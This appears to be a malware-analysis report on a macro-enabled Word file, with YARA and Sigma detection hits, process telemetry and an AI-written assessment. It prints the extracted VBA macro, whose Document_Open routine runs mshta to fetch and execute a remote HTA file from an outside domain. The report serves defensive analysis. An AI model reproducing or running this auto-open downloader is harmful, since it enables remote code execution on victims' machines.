trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

macros.vba_code:
Private Sub Document_New()

End Sub

Private Sub Document_Open()
Shell ("mshta https://login-main.bigwnet.com/attachment/view/Msgxo0.hta")
End Sub

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file

match_context.values: @{Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=mshta https://login-main.bigwnet.com/attachment/view/Msgxo0.hta; EventID=1; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Windows\system32\; OriginalFileName=MSHTA.EXE; Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=mshta https://login-main.bigwnet.com/attachment/view/Msgxo0.hta; EventID=1; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Suspicious Browser Launch From Document Reader Process
sigma_analysis_results.rule_description: Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Windows\system32\; OriginalFileName=MSHTA.EXE; Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=mshta https://login-main.bigwnet.com/attachment/view/Msgxo0.hta; EventID=1; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

crowdsourced_ai_results.analysis:
The macros extracted from the document exhibit malicious behavior. In the 'ThisDocument.cls' module, the 'Document_Open()' subroutine contains a call to the 'Shell' function with a command to execute 'mshta https://login-main.bigwnet.com/attachment/view/Msgxo0.hta'. This command launches an HTML Application (HTA) file hosted on a suspicious domain, indicating potential malicious intent to download and execute arbitrary code from the internet.

The use of the 'Shell' function to execute content from a remote location is a common tactic used by malware to initiate malicious activities on the victim's system. In this case, the macro attempts to open a URL that may lead to the download and execution of further malicious payloads, posing a significant security risk.

Additionally, the presence of multiple 'Attribute VB_Control' declarations in the 'ThisDocument.cls' module suggests an attempt at obfuscation or confusion by including unnecessary control attributes.

Overall, the behavior of the macros raises red flags associated with malicious intent, such as executing commands from external URLs, which could potentially lead to unauthorized access, data theft, or system compromise.

The macro uses the `Shell` function to execute a command. The command being executed is "mshta https://login-main.bigwnet.com/attachment/view/Msgxo0.hta". This opens the Microsoft HTML Application Host (mshta.exe) and instructs it to download and execute a file from the specified URL. This is a strong indicator of malicious intent as it allows arbitrary code execution from a remote server.
